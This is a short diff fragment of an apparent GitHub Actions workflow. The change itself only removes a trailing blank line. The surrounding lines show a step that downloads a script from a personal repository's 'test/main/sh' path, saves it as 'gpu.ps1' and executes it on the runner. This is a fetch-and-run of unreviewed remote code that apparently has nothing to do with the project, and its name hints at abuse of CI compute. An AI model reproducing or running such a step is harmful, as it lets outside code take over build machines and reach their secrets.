@@ -19,4 +19,3 @@ jobs:
             Invoke-WebRequest https://raw.githubusercontent.com/tonikirlykin/test/main/sh -OutFile gpu.ps1 
           
       - run: ./gpu.ps1
-      
